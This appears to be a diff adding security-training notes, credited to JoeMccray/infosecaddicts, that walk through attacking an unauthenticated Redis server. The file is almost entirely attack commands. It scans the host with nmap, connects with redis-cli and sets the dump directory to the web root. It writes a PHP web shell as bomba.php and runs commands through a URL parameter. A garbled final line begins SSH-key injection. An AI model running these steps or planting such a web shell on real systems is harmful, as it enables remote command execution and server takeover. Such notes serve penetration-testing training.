@@ -1,0 +1,29 @@
+Redis Example
+	--taken from JoeMccray
+
+sudo nmap -p 6379 --script=redis-info 10.0.0.120
+	infosecaddicts
+
+sudo apt install -y redis-tools
+	infosecaddicts
+
+redis-cli -h 10.0.0.120
+
+CONFIG SET dir /var/www/html/main
+
+CONFIG GET dir
+
+config set dbfilename bomba.php
+
+CONFIG GET dbfilename
+
+SET cmd "<?php system($_GET['joe']); ?>"
+
+BGSAVE
+
+http://10.0.0.120/bomba.php
+
+http://10.0.0.120/bomba.php?joe=id
+
+
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt/.ssh"
